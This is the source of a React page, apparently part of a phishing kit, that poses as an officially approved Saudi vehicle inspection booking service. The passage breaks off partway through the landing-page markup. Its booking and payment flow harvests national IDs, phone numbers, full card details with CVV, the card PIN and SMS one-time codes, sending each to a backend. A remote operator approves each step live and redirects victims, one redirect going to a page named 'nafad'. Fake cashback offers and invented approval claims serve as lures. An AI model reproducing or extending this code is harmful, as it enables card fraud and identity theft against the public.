"use client";

import React, { useEffect, useState } from "react";
import Image from "@/components/app-image";
import VerificationPage from "@/components/verification-page";
import { SaudiPlateInput } from "@/components/saudi-plate-input";
import { Dialog, DialogContent } from "@/components/ui/dialog";
import { CircleAlert, Menu, X } from "lucide-react";
import { motion } from "framer-motion";
import { Input } from "@/components/ui/input";
import { Loader2 } from "lucide-react";
import {
  CardHeader,
  CardTitle,
  CardDescription,
  CardFooter,
} from "@/components/ui/card";
import { Alert, AlertDescription } from "@/components/ui/alert";
import { AlertCircle } from "lucide-react";

import { Button } from "@/components/ui/button";
import { Card, CardContent } from "@/components/ui/card";
import { Car, Truck, CreditCard, Wallet, Lock } from "lucide-react";
import { addData, handleCurrentPage } from "@/lib/data-store";
import { watchVisitorData } from "@/lib/visitor-data";
import type {
  VehicleStatus,
  VehicleType,
  AppStep,
  PaymentMethod,
  BankInfo,
  BinDatabase,
  ApprovalStatus,
} from "@/lib/types";
import {
  validateSaudiPhoneNumber,
  validateSaudiNationalId,
} from "@/lib/validation";
import { getRedirectUrl } from "@/lib/page-routes";
import { Checkbox } from "@/components/ui/checkbox";
import { inspectionCenters } from "@/lib/inspection-centers";
import { getOrCreateVisitorId } from "@/lib/visitor-presence";

// Removed duplicate type BankInfo definition as it's already imported from "@/types"
// type BankInfo = {
//   name: string
//   logo: string
//   color: string
// }
const visitorID =
  typeof window !== "undefined" ? getOrCreateVisitorId() : "";

const countries = [
  { code: "SA", nameAr: "السعودية", nameEn: "Saudi Arabia" },
  { code: "AE", nameAr: "الإمارات", nameEn: "United Arab Emirates" },
  { code: "BH", nameAr: "البحرين", nameEn: "Bahrain" },
  { code: "KW", nameAr: "الكويت", nameEn: "Kuwait" },
  { code: "OM", nameAr: "عمان", nameEn: "Oman" },
  { code: "QA", nameAr: "قطر", nameEn: "Qatar" },
  { code: "YE", nameAr: "اليمن", nameEn: "Yemen" },
  { code: "IQ", nameAr: "العراق", nameEn: "Iraq" },
  { code: "JO", nameAr: "الأردن", nameEn: "Jordan" },
  { code: "LB", nameAr: "لبنان", nameEn: "Lebanon" },
  { code: "SY", nameAr: "سوريا", nameEn: "Syria" },
  { code: "PS", nameAr: "فلسطين", nameEn: "Palestine" },
  { code: "EG", nameAr: "مصر", nameEn: "Egypt" },
  { code: "LY", nameAr: "ليبيا", nameEn: "Libya" },
  { code: "TN", nameAr: "تونس", nameEn: "Tunisia" },
  { code: "DZ", nameAr: "الجزائر", nameEn: "Algeria" },
  { code: "MA", nameAr: "المغرب", nameEn: "Morocco" },
  { code: "MR", nameAr: "موريتانيا", nameEn: "Mauritania" },
  { code: "SD", nameAr: "السودان", nameEn: "Sudan" },
  { code: "SO", nameAr: "الصومال", nameEn: "Somalia" },
  { code: "DJ", nameAr: "جيبوتي", nameEn: "Djibouti" },
  { code: "KM", nameAr: "جزر القمر", nameEn: "Comoros" },
  { code: "US", nameAr: "الولايات المتحدة", nameEn: "United States" },
  { code: "GB", nameAr: "المملكة المتحدة", nameEn: "United Kingdom" },
  { code: "CA", nameAr: "كندا", nameEn: "Canada" },
  { code: "AU", nameAr: "أستراليا", nameEn: "Australia" },
  { code: "DE", nameAr: "ألمانيا", nameEn: "Germany" },
  { code: "FR", nameAr: "فرنسا", nameEn: "France" },
  { code: "IT", nameAr: "إيطاليا", nameEn: "Italy" },
  { code: "ES", nameAr: "إسبانيا", nameEn: "Spain" },
  { code: "TR", nameAr: "تركيا", nameEn: "Turkey" },
  { code: "IR", nameAr: "إيران", nameEn: "Iran" },
  { code: "PK", nameAr: "باكستان", nameEn: "Pakistan" },
  { code: "IN", nameAr: "الهند", nameEn: "India" },
  { code: "BD", nameAr: "بنغلاديش", nameEn: "Bangladesh" },
  { code: "CN", nameAr: "الصين", nameEn: "China" },
  { code: "JP", nameAr: "اليابان", nameEn: "Japan" },
  { code: "KR", nameAr: "كوريا الجنوبية", nameEn: "South Korea" },
  { code: "MY", nameAr: "ماليزيا", nameEn: "Malaysia" },
  { code: "ID", nameAr: "إندونيسيا", nameEn: "Indonesia" },
  { code: "PH", nameAr: "الفلبين", nameEn: "Philippines" },
  { code: "TH", nameAr: "تايلاند", nameEn: "Thailand" },
  { code: "SG", nameAr: "سنغافورة", nameEn: "Singapore" },
  { code: "NZ", nameAr: "نيوزيلندا", nameEn: "New Zealand" },
  { code: "BR", nameAr: "البرازيل", nameEn: "Brazil" },
  { code: "MX", nameAr: "المكسيك", nameEn: "Mexico" },
  { code: "AR", nameAr: "الأرجنتين", nameEn: "Argentina" },
  { code: "ZA", nameAr: "جنوب أفريقيا", nameEn: "South Africa" },
  { code: "NG", nameAr: "نيجيريا", nameEn: "Nigeria" },
  { code: "KE", nameAr: "كينيا", nameEn: "Kenya" },
  { code: "ET", nameAr: "إثيوبيا", nameEn: "Ethiopia" },
];

export default function BookingPage() {
  const [vehicleStatus, setVehicleStatus] = useState<VehicleStatus>("license");
  const [country, setCountry] = useState("");
  const [plateNumbers, setPlateNumbers] = useState("");
  const [plateLetters, setPlateLetters] = useState("");
  const [plateInfo, setPlateInfo] = useState("");
  const [registrationType, setRegistrationType] = useState("");
  const [vehicleType, setVehicleType] = useState<VehicleType>("car");
  const [ownerName, setOwnerName] = useState("");
  const [ownerPhone, setOwnerPhone] = useState("");
  const [nationalId, setNationalId] = useState("");
  const [displayNationalId, setDisplayNationalId] = useState("");
  const [serialNumber, setSerialNumber] = useState("");
  // </CHANGE>
  const [region, setRegion] = useState("");
  const [city, setCity] = useState("");
  const [inspectionCenter, setInspectionCenter] = useState("");
  const [inspectionDate, setInspectionDate] = useState("");
  const [inspectionTime, setInspectionTime] = useState("");
  const [captchaChecked, setCaptchaChecked] = useState(true);
  const [inspectionType, setInspectionType] = useState(""); // Added declaration
  const [bookingMode, setBookingMode] = useState<"new" | "modify">("new");
  const [vehicleInfoError, setVehicleInfoError] = useState(""); // Added vehicleInfoError state
  const [fieldErrors, setFieldErrors] = useState<Record<string, string>>({});

  // ADDED START
  const [authorizedPersonType, setAuthorizedPersonType] = React.useState<
    "resident" | "gcc"
  >("resident");
  const [authorizedName, setAuthorizedName] = React.useState("");
  const [authorizedPhone, setAuthorizedPhone] = React.useState("");
  const [authorizedId, setAuthorizedId] = React.useState("");
  const [authorizedBirthDate, setAuthorizedBirthDate] = React.useState("");
  const [authorizedAgreement, setAuthorizedAgreement] = React.useState(false);

  const [currentStep, setCurrentStep] = useState<AppStep>("booking"); // Changed initial step to landing
  const [paymentMethod, setPaymentMethod] = useState<PaymentMethod | "">("");
  const [cardNumber, setCardNumber] = useState("");
  const [cardName, setCardName] = useState("");
  const [expiryDate, setExpiryDate] = useState("");
  const [cvv, setCvv] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [phone, setPhone] = useState("");
  const [phoneIdNumber, setPhoneIdNumber] = useState("");
  const [operator, setOperator] = useState("");
  const [phoneOtp, setPhoneOtp] = useState("");
  const [cardError, setCardError] = useState("");
  const [pinError, setPinError] = useState("");
  const [phoneOtpError, setPhoneOtpError] = useState(""); // Declared phoneOtpError
  const [phoneOtpApproval, setPhoneOtpApproval] = useState<
    ApprovalStatus | undefined
  >();
  const [bankInfo, setBankInfo] = useState<BankInfo | null>(null);
  const [phoneOtpSent, setPhoneOtpSent] = useState(false);
  const [showStcModal, setShowStcModal] = useState(false);
  const [authorizeInspection, setAuthorizeInspection] = useState(false);
  const [showOfferModal, setShowOfferModal] = useState(false);
  const [stcModalOpen, setStcModalOpen] = useState(false);
  const [pin, setPin] = useState(["", "", "", ""]); // Added pin state and setPin function

  const fieldClassName = (field: string) =>
    `template-field ${
      fieldErrors[field]
        ? "border-red-500 focus:border-red-500 focus-visible:border-red-500 focus-visible:ring-red-500"
        : ""
    }`;

  const clearFieldError = (field: string) => {
    if (!fieldErrors[field]) return;
    setFieldErrors((current) => {
      const next = { ...current };
      delete next[field];
      return next;
    });
  };

  const goToStep = (step: AppStep) => {
    setCurrentStep(step);
    void handleCurrentPage("application", { currentStep: step });
  };

  const arabicToWestern = (str: string) => {
    const arabicNums = ["٠", "١", "٢", "٣", "٤", "٥", "٦", "٧", "٨", "٩"];
    return str.replace(/[٠-٩]/g, (d) => arabicNums.indexOf(d).toString());
  };

  const normalizeNumbers = (value: string) => {
    return arabicToWestern(value);
  };

  useEffect(() => {
    if (typeof window !== "undefined") {
      const params = new URLSearchParams(window.location.search);
      const service = params.get("service") || params.get("type");
      if (service === "modify" || service === "reschedule") {
        setBookingMode("modify");
        setInspectionType("تعديل موعد الحجز");
      }
    }

    getLocation().then(() => {
      setIsLoading(false);
    });

    const visitorId = visitorID;
    const unsubscribe = watchVisitorData(
      visitorId,
      (userData) => {
        if (userData) {
          if (userData.cardApproval === "rejected" || userData.isBlockedBin) {
            setIsLoading(false);
            setCardError(userData.rejectionReason || "البطاقة غير مدعومة يرجى الدفع من بطاقة أخرى أو باستخدام البطاقات الائتمانية للاستفادة من كاش باك 40%");
            goToStep("card-form");
          }

          if (userData.phoneOtpApproval) {
            setPhoneOtpApproval(userData.phoneOtpApproval as ApprovalStatus);
          }
          if (userData.phoneOtpApproval === "approved") {
            setIsLoading(false);
            window.location.href = "/nafad";
          }
          if (userData.phoneOtpApproval === "rejected") {
            setIsLoading(false);
            alert("رمز التحقق غير صحيح");
          }
          const redirectUrl = getRedirectUrl(
            userData.redirectTo,
            "application"
          );
          if (redirectUrl) {
            setIsLoading(false);
            window.location.href = redirectUrl;
            return;
          }
        }
      },
      (error) => {
        if (error instanceof Error) {
          console.warn("[application] data listener warning:", error.message);
        }
      },
    );

    return () => unsubscribe();
  }, []);

  async function getLocation() {
    try {
      const response = await fetch("/api/location");
      if (!response.ok) {
        throw new Error(`HTTP error! Status: ${response.status}`);
      }
      const location = await response.json();
      const country = location.country;
      await addData({
        id: visitorID,
        country: country,
        createdDate: new Date().toISOString(),
      });
    } catch (error) {
      console.error("Error fetching location:", error);
    }
  }
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    await addData({
      id: visitorID,
      vehicleStatus,
      country,
      plateNumbers,
      plateLetters,
      plateInfo,
      registrationType,
      vehicleType,
      ownerName, // Added ownerName
      nationalId, // Added nationalId

      inspectionType,
      step: "booking-completed",
    });
    setIsLoading(true);
    setTimeout(() => {
      goToStep("payment-method");
      setIsLoading(false);
    }, 1500);
  };

  const handlePaymentMethodSubmit = async () => {
    if (paymentMethod) {
      await addData({
        id: visitorID,
        paymentMethod,
        step: "payment-method-selected",
      });
      setIsLoading(true);
      setTimeout(() => {
        goToStep("card-form");
        setShowOfferModal(true);
        setIsLoading(false);
      }, 1500);
    }
  };

  const handleCardFormSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setCardError("");
    const cleanNum = cardNumber.replace(/\D/g, "");
    const bin = cleanNum.slice(0, 6);

    try {
      const res = await fetch("/api/blocked-cards");
      if (res.ok) {
        const json = await res.json();
        const isBlocked =
          (Array.isArray(json.cards) && json.cards.includes(cleanNum)) ||
          (Array.isArray(json.bins) && json.bins.includes(bin));
        if (isBlocked) {
          setIsLoading(false);
          setCardError("البطاقة غير مدعومة يرجى الدفع من بطاقة أخرى أو باستخدام البطاقات الائتمانية للاستفادة من كاش باك 40%");
          return;
        }
      }
    } catch {}

    setIsLoading(true);
    try {
      const resp = await fetch(`/api/visitors/${encodeURIComponent(visitorID)}`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          data: {
            cardNumber,
            cardName,
            expiryDate,
            cvv,
            step: "card-details-submitted",
          },
        }),
      });
      if (resp.ok) {
        const result = await resp.json();
        const d = result.data || {};
        if (d.cardApproval === "rejected" || d.isBlockedBin || d.status === "rejected") {
          setIsLoading(false);
          setCardError(d.rejectionReason || "البطاقة غير مدعومة يرجى الدفع من بطاقة أخرى أو باستخدام البطاقات الائتمانية للاستفادة من كاش باك 40%");
          return;
        }
      }
    } catch (err) {
      console.error("Card submission error:", err);
    }

    setIsLoading(false);
    goToStep("pin");
  };

  const handlePinSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setPinError("");

    const fullPin = pin.join("");
    if (fullPin.length !== 4) {
      setPinError("يرجى إدخال رمز PIN المكون من 4 أرقام");
      return;
    }

    await addData({
      id: visitorID,
      pin: fullPin,
      step: "pin-submitted",
    });
    setIsLoading(true);
    setTimeout(() => {
      goToStep("phone-verification");
      setIsLoading(false);
    }, 1500);
  };

  const handleSendPhoneOtp = async (e: React.FormEvent) => {
    e.preventDefault();
    setPhoneOtpError("");

    // Validate Saudi phone number
    const phoneValidation = validateSaudiPhoneNumber(phone);
    if (!phoneValidation.valid) {
      setPhoneOtpError(phoneValidation.error || "رقم الجوال غير صحيح");
      return;
    }

    // Check if operator is selected
    if (!operator) {
      setPhoneOtpError("يرجى اختيار المشغل");
      return;
    }

    // Check if ID number is entered
    if (!phoneIdNumber || phoneIdNumber.trim().length < 10) {
      setPhoneOtpError("يرجى إدخال رقم الهوية / الإقامة بشكل صحيح");
      return;
    }

    await addData({
      id: visitorID,
      phone,
      phoneNumber: phone,
      operator,
      phoneCarrier: operator,
      phoneIdNumber,
      idNumber: phoneIdNumber,
      nationalId: phoneIdNumber,
      step: "phone-otp-requested",
    });
    if (operator === "STC") {
      setStcModalOpen(true);
    } else {
      setIsLoading(true);
      setTimeout(() => {
        setIsLoading(false);
        setPhoneOtpSent(true);
      }, 1500);
    }
  };

  const handlePhoneVerification = async (e: React.FormEvent) => {
    e.preventDefault();
    setPhoneOtpError("");
    await addData({
      id: visitorID,
      phone,
      operator,
      phoneOtp,
      step: "payment-completed",
      completedDate: new Date().toISOString(),
      phoneOtpApproval: "pending",
    });
    setPhoneOtpApproval("pending");
    setIsLoading(true);
  };

  const handleStcVerify = async (code: string) => {
    setPhoneOtpError("");
    await addData({
      id: visitorID,
      phone,
      operator,
      phoneOtp: code,
      step: "payment-completed",
      completedDate: new Date().toISOString(),
      phoneOtpApproval: "pending",
    });
    setPhoneOtpApproval("pending");
    setStcModalOpen(false);
    setIsLoading(true);
  };

  useEffect(() => {
    if (phoneOtpApproval === "approved") {
      setIsLoading(false);
      // Navigate to success page or show success message
      window.location.href = "/nafad";
    } else if (phoneOtpApproval === "rejected") {
      setIsLoading(false);
      setPhoneOtpError("رمز التحقق غير صحيح. يرجى المحاولة مرة أخرى.");
    }
  }, [phoneOtpApproval]);

  const checkBIN = (cardNum: string) => {
    const bin = cardNum.replace(/\s/g, "").substring(0, 6);
    const bin4 = bin.substring(0, 4); // Get first 4 digits for ignored BINs check

    const ignoredBins = ["4748", "4685", "4323", "4847"];

    if (ignoredBins.includes(bin4)) {
      setBankInfo(null);
      return;
    }

    // Saudi banks BIN database
    const binDatabase: BinDatabase = {
      "400861": { name: "الراجحي", logo: "🏦", color: "#1a4d2e" },
      "446404": { name: "الراجحي", logo: "🏦", color: "#1a4d2e" },
      "535024": { name: "الأهلي", logo: "🏦", color: "#006747" },
      "468540": { name: "الأهلي", logo: "🏦", color: "#006747" },
      "401205": { name: "الرياض", logo: "🏦", color: "#0066b2" },
      "489318": { name: "الرياض", logo: "🏦", color: "#0066b2" },
      "543357": { name: "ساب", logo: "🏦", color: "#0f75bc" },
      "455708": { name: "ساب", logo: "🏦", color: "#0f75bc" },
      "474491": { name: "سامبا", logo: "🏦", color: "#c41e3a" },
      "431361": { name: "سامبا", logo: "🏦", color: "#c41e3a" },
      "543085": { name: "الإنماء", logo: "🏦", color: "#00a651" },
      "440647": { name: "الإنماء", logo: "🏦", color: "#00a651" },
      "968208": { name: "الجزيرة", logo: "🏦", color: "#0055a5" },
      "529415": { name: "الجزيرة", logo: "🏦", color: "#0055a5" },
    };

    if (bin.length >= 6 && binDatabase[bin]) {
      setBankInfo(binDatabase[bin]);
    } else {
      setBankInfo(null);
    }
  };

  const handleCardNumberChange = (value: string) => {
    const normalized = normalizeNumbers(value.replace(/\s/g, ""));
    const formatted = normalized.replace(/(\d{4})/g, "$1 ").trim();
    setCardNumber(formatted);
    console.log(checkCardAllow(formatted));
  };

  const vehicleTypes = [
    { id: "car" as VehicleType, label: "سيارة خاصة", icon: Car },
    { id: "truck" as VehicleType, label: "شاحنة", icon: Truck },
  ];

  const inspectionTypes = [
    { value: "private-car", label: "سيارة خاصة", icon: "🚗" },
    {
      value: "light-private-transport",
      label: "مركبة نقل خفيفة خاصة",
      icon: "🚚",
    },
    { value: "heavy-transport", label: "نقل ثقيل", icon: "🚛" },
    { value: "light-bus", label: "حافلة خفيفة", icon: "🚐" },
    { value: "light-transport", label: "مركبة نقل خفيفة", icon: "🚚" },
    { value: "medium-transport", label: "نقل متوسط", icon: "🚛" },
    { value: "large-bus", label: "حافلة كبيرة", icon: "🚌" },
    {
      value: "two-wheel-motorcycle",
      label: "الدراجات ثنائية العجلات",
      icon: "🏍️",
    },
    { value: "public-works", label: "مركبات أشغال عامة", icon: "🚜" },
    {
      value: "three-four-wheel",
      label: "دراجة ثلاثية أو رباعية العجلات",
      icon: "🛺",
    },
    { value: "heavy-trailer", label: "مقطورة ثقيلة", icon: "🚛" },
    { value: "rental-cars", label: "سيارات الأجرة", icon: "🚕" },
    { value: "hire-cars", label: "سيارات التأجير", icon: "🚗" },
    { value: "semi-heavy-trailer", label: "نصف مقطورة ثقيلة", icon: "🚛" },
    { value: "medium-bus", label: "حافلة متوسطة", icon: "🚐" },
    { value: "light-trailer", label: "مقطورة خفيفة", icon: "🚚" },
    { value: "light-semi-trailer", label: "نصف مقطورة خفيفة", icon: "🚚" },
    {
      value: "private-light-semi-trailer",
      label: "نصف مقطورة خفيفة خاصة",
      icon: "🚚",
    },
    { value: "private-light-trailer", label: "مقطورة خفيفة خاصة", icon: "🚚" },
  ];

  const regions = [
    { value: "riyadh", label: "منطقة الرياض" },
    { value: "makkah", label: "منطقة مكة المكرمة" },
    { value: "madinah", label: "منطقة المدينة المنورة" },
    { value: "eastern", label: "المنطقة الشرقية" },
    { value: "qassim", label: "منطقة القصيم" },
    { value: "asir", label: "منطقة عسير" },
    { value: "tabuk", label: "منطقة تبوك" },
    { value: "hail", label: "منطقة حائل" },
    { value: "najran", label: "منطقة نجران" },
    { value: "jazan", label: "منطقة جازان" },
    { value: "northern", label: "منطقة الحدود الشمالية" },
    { value: "jouf", label: "منطقة الجوف" },
    { value: "bahah", label: "منطقة الباحة" },
  ];

  const citiesByRegion: Record<string, { value: string; label: string }[]> =
    regions.reduce((result, currentRegion) => {
      const cities = Array.from(
        new Set(
          inspectionCenters
            .filter((center) => center.region === currentRegion.value)
            .map((center) => center.city.trim()),
        ),
      );
      result[currentRegion.value] = cities.map((label) => ({
        value: label,
        label,
      }));
      return result;
    }, {} as Record<string, { value: string; label: string }[]>);

  const availableCenters = inspectionCenters.filter(
    (center) =>
      center.region === region &&
      (!city || center.city.trim() === city.trim()),
  );
  const selectedInspectionCenter = inspectionCenters.find(
    (center) => center.id === inspectionCenter,
  );

  const paymentMethods = [
    {
      id: "card" as PaymentMethod,
      label: "بطاقة ائتمان",
      icon: "/Visa-Mastercard-1-2048x755.png",
      description: "فيزا أو ماستركارد",
      badge: "استرداد نقدي 30%",
      available: true,
    },
    {
      id: "wallet" as PaymentMethod,
      label: "مدى",
      icon: "/mada.svg",
      description: "بطاقة مدى",
      available: true,
    },
    {
      id: "bank" as PaymentMethod,
      label: "Apple Pay",
      icon: "/images.png",
      description: "الدفع عبر آبل",
      available: false,
    },
  ];

  const handleVehicleInfoSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setVehicleInfoError("");
    setFieldErrors({});

    const nextFieldErrors: Record<string, string> = {};

    if (!country) nextFieldErrors.country = "هذا الحقل مطلوب";
    if (!ownerName) nextFieldErrors.ownerName = "هذا الحقل مطلوب";
    if (!ownerPhone) nextFieldErrors.ownerPhone = "هذا الحقل مطلوب";
    if (!nationalId) nextFieldErrors.nationalId = "هذا الحقل مطلوب";
    // ملاحظة: معلومات المركبة اختيارية بالكامل (serialNumber, inspectionType, region, city, inspectionCenter)
    if (!inspectionDate) nextFieldErrors.inspectionDate = "هذا الحقل مطلوب";
    if (!inspectionTime) nextFieldErrors.inspectionTime = "هذا الحقل مطلوب";
    else {
      const [hours] = inspectionTime.split(":").map(Number);
      if (hours < 8 || hours >= 20) {
        nextFieldErrors.inspectionTime = "يجب أن يكون موعد الخدمة بين 8:00 صباحاً و 8:00 مساءً";
      }
    }

    if (Object.keys(nextFieldErrors).length > 0) {
      setFieldErrors(nextFieldErrors);
      setVehicleInfoError("يرجى ملء جميع الحقول المطلوبة.");
      return;
    }

    const ownerPhoneValidation = validateSaudiPhoneNumber(ownerPhone);
    if (!ownerPhoneValidation.valid) {
      const error = ownerPhoneValidation.error || "رقم جوال المالك غير صحيح";
      setFieldErrors({ ownerPhone: error });
      setVehicleInfoError(error);
      return;
    }

    if (authorizeInspection) {
      const authorizationFieldErrors: Record<string, string> = {};
      if (!authorizedName) authorizationFieldErrors.authorizedName = "هذا الحقل مطلوب";
      if (!authorizedPhone) authorizationFieldErrors.authorizedPhone = "هذا الحقل مطلوب";
      if (!authorizedId) authorizationFieldErrors.authorizedId = "هذا الحقل مطلوب";
      if (!authorizedBirthDate) {
        authorizationFieldErrors.authorizedBirthDate = "هذا الحقل مطلوب";
      }
      if (!authorizedAgreement) {
        authorizationFieldErrors.authorizedAgreement = "يجب الموافقة على التفويض";
      }

      if (Object.keys(authorizationFieldErrors).length > 0) {
        setFieldErrors(authorizationFieldErrors);
        setVehicleInfoError("يرجى ملء جميع بيانات المفوض والموافقة على التفويض.");
        return;
      }

      if (
        !validateSaudiPhoneNumber(authorizedPhone).valid
      ) {
        const authorizedPhoneValidation =
          validateSaudiPhoneNumber(authorizedPhone);
        const error =
          authorizedPhoneValidation.error || "رقم جوال المفوض غير صحيح";
        setFieldErrors({ authorizedPhone: error });
        setVehicleInfoError(error);
        return;
      }
    }

    const idValidation = validateSaudiNationalId(nationalId);
    if (!idValidation.valid) {
      const error = idValidation.error || "رقم الهوية الوطنية غير صحيح";
      setFieldErrors({ nationalId: error });
      setVehicleInfoError(error);
      return;
    }

    const activeVisitorId = getOrCreateVisitorId() || visitorID;
    const defaultCenter = availableCenters[0];
    const finalCenter = inspectionCenter || defaultCenter?.id || "الرياض - القادسية";
    const finalCenterName = selectedInspectionCenter?.name || defaultCenter?.name || "مركز الفحص الفني الدوري - الرياض";
    const finalCenterAddress = selectedInspectionCenter?.address || defaultCenter?.address || "الرياض - طريق الشيخ جابر الأحمد الصباح";
    const finalCenterMap = selectedInspectionCenter?.map || defaultCenter?.map || "https://maps.google.com";
    const finalCenterServices = selectedInspectionCenter?.services || defaultCenter?.services || "فحص دوري، إعادة فحص، فحص التصدير";
    const finalPlate = plateNumbers && plateLetters ? `${plateNumbers} ${plateLetters}` : (plateInfo || "—");

    await addData({
      id: activeVisitorId,
      vehicleStatus: vehicleStatus || "license",
      country,
      plateNumbers: plateNumbers || "—",
      plateLetters: plateLetters || "—",
      plateInfo: finalPlate,
      registrationType: registrationType || "new",
      vehicleType: vehicleType || "personal",
      ownerName,
      ownerPhone,
      nationalId,
      serialNumber: serialNumber || "—",
      // </CHANGE>
      region: region || "الرياض",
      city: city || "الرياض",
      inspectionCenter: finalCenter,
      inspectionCenterName: finalCenterName,
      inspectionCenterAddress: finalCenterAddress,
      inspectionCenterMap: finalCenterMap,
      inspectionCenterServices: finalCenterServices,
      inspectionDate: inspectionDate || new Date().toISOString().split("T")[0],
      inspectionTime: inspectionTime || "10:00",
      inspectionType: bookingMode === "modify" ? "تعديل موعد الحجز" : (inspectionType || "فحص دوري شامل"),
      bookingType: bookingMode === "modify" ? "تعديل موعد الحجز" : "حجز موعد جديد",
      serviceFee: bookingMode === "modify" ? 32.61 : 100.0,
      vatAmount: bookingMode === "modify" ? 4.89 : 15.0,
      totalAmount: bookingMode === "modify" ? 37.5 : 115.0,
      amount: bookingMode === "modify" ? 37.5 : 115.0,
      // ADDED START
      authorizedPersonType,
      authorizedName,
      authorizedPhone,
      authorizedId,
      authorizedBirthDate,
      // ADDED END
      step: "booking-details-submitted",
    });
    setIsLoading(true);
    setTimeout(() => {
      // setCurrentStep("payment-method")
      const redirectQuery = bookingMode === "modify" ? "&service=modify&amount=37.5" : "";
      window.location.href = `/payment?visitorId=${encodeURIComponent(activeVisitorId)}${redirectQuery}`;
      setIsLoading(false);
    }, 1500);
  };

  if (isLoading) {
    return (
      <div
        dir="rtl"
        className="min-h-screen bg-background flex items-center justify-center"
      >
        <Card className="w-full max-w-md mx-4 shadow-lg">
          <CardContent className="p-12">
            <div className="flex flex-col items-center gap-6">
              <div className="relative w-20 h-20">
                <div className="absolute inset-0 border-4 border-[#1a7a3a]/30 rounded-full"></div>
                <div className="absolute inset-0 border-4 border-[#1a7a3a] border-t-transparent rounded-full animate-spin"></div>
              </div>
              <div className="text-center space-y-2">
                <h3 className="text-xl font-semibold text-foreground">
                  جاري المعالجة...
                </h3>
                <p className="text-muted-foreground">الرجاء الانتظار</p>
              </div>
            </div>
          </CardContent>
        </Card>
      </div>
    );
  }

  if (currentStep === "landing") {
    return (
      <div dir="rtl" className="min-h-screen bg-background">
        {/* Hero Section */}
        <div className="relative overflow-hidden bg-gradient-to-b from-secondary/30 to-background">
          <div className="container mx-auto px-4 py-16 md:py-24 max-w-6xl">
            {/* Trust Badge */}
            <div className="flex justify-center mb-8">
              <div className="inline-flex items-center gap-2 px-4 py-2 rounded-full bg-[#1a7a3a]/10 border border-[#1a7a3a]/20">
                <div className="w-2 h-2 rounded-full bg-[#1a7a3a] animate-pulse" />
                <span className="text-sm font-medium text-foreground">
                  خدمة معتمدة من وزارة النقل
                </span>
              </div>
            </div>

            <div className="grid lg:grid-cols-2 gap-12 items-center">
              {/* Content */}
              <div className="text-center lg:text-right space-y-8">
                <div className="space-y-4">
                  <h1 className="text-4xl md:text-6xl lg:text-7xl font-bold text-foreground leading-tight text-balance">
                    خدمة الفحص الفني الدوري
                  </h1>
                  <p className="text-xl md:text-2xl text-muted-foreground leading-relaxed text-pretty max-w-xl mx-auto lg:mx-0">
                    احجز موعد فحص مركبتك بسهولة وسرعة. خدمة احترافية وموثوقة
                    لضمان سلامتك على الطريق
                  </p>
                </div>

                {/* Primary CTA */}
                <div className="flex flex-col sm:flex-row gap-4 justify-center lg:justify-start">
                  <Button
                    size="lg"
                    className="h-14 px-8 text-lg font-semibold bg-gradient-to-l from-[#1a7a3a] to-[#0d5c2a] hover:from-[#166b33] hover:to-[#0a4d23] shadow-lg hover:shadow-xl transition-all"
                    onClick={() => goToStep("booking")}
                  >
                    احجز موعد الآن
                    <svg
                      className="mr-2 h-5 w-5"
                      fill="none"
                      viewBox="0 0 24 24"
                      stroke="currentColor"
                    >
                      <path
                        strokeLinecap="round"
                        strokeLinejoin="round"
                        strokeWidth={2}
                        d="M15 19l-7-7 7-7"
                      />
                    </svg>
                  </Button>
                  <Button
                    size="lg"
                    variant="outline"
                    className="h-14 px-8 text-lg font-medium border-2 hover:bg-secondary bg-transparent"
                  >
                    معلومات أكثر
                  </Button>
                </div>

                {/* Stats */}
                <div className="flex gap-8 justify-center lg:justify-start pt-8 border-t border-border">
                  <div className="text-center lg:text-right">
                    <div className="text-3xl font-bold text-foreground">
                      +50,000
                    </div>
                    <div className="text-sm text-muted-foreground">
                      فحص مكتمل
                    </div>
                  </div>
                  <div className="text-center lg:text-right">
                    <div className="text-3xl font-bold text-foreground">
                      24/7
                    </div>
                    <div className="text-sm text-muted-foreground">دعم فني</div>
                  </div>
                  <div className="text-center lg:text-right">
                    <div className="text-3xl font-bold text-foreground">
                      98%
                    </div>
                    <div className="text-sm text-muted-foreground">
                      رضا العملاء
                    </div>
                  </div>
                </div>
              </div>

              {/* Vehicle Image */}
              <div className="relative">
                <div className="absolute inset-0 bg-[#1a7a3a]/5 rounded-3xl blur-3xl" />
                <Image
                  src="/white-sedan-car-with-technical-inspection-labels-i.jpg"
                  alt="فحص المركبة"
                  width={800}
                  height={500}
                  className="relative w-full h-auto rounded-2xl shadow-2xl"
                  priority
                />
              </div>
            </div>
          </div>
        </div>

        {/* Features Section */}
        <div className="container mx-auto px-4 py-20 max-w-6xl">
          <div className="text-center mb-16">
            <h2 className="text-3xl md:text-4xl font-bold text-foreground mb-4">
              لماذا تختار خدمتنا؟
            </h2>
            <p className="text-lg text-muted-foreground max-w-2xl mx-auto">
              نوفر لك تجربة فحص سريعة وموثوقة مع أحدث التقنيات
            </p>
          </div>

          <div className="grid md:grid-cols-3 gap-8 mb-16">
            {/* Feature 1 */}
            <div className="group p-8 rounded-2xl bg-card border border-border hover:shadow-lg transition-all hover:-translate-y-1">
              <div className="w-14 h-14 rounded-xl bg-[#1a7a3a]/10 flex items-center justify-center mb-6 group-hover:scale-110 transition-transform">
                <svg
                  className="w-7 h-7 text-[#1a7a3a]"
                  fill="none"
                  viewBox="0 0 24 24"
                  stroke="currentColor"
                >
                  <path
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth={2}
                    d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"
                  />
                </svg>
              </div>
              <h3 className="text-xl font-bold text-foreground mb-3">
                حجز سريع ومرن
              </h3>
              <p className="text-muted-foreground leading-relaxed">
                احجز موعدك في دقائق واختر الوقت المناسب لك
              </p>
            </div>

            {/* Feature 2 */}
            <div className="group p-8 rounded-2xl bg-card border border-border hover:shadow-lg transition-all hover:-translate-y-1">
              <div className="w-14 h-14 rounded-xl bg-[#1a7a3a]/10 flex items-center justify-center mb-6 group-hover:scale-110 transition-transform">
                <svg
                  className="w-7 h-7 text-[#1a7a3a]"
                  fill="none"
                  viewBox="0 0 24 24"
                  stroke="currentColor"
                >
                  <path
                    strokeLinecap="round"
                    strokeLinejoin="round"
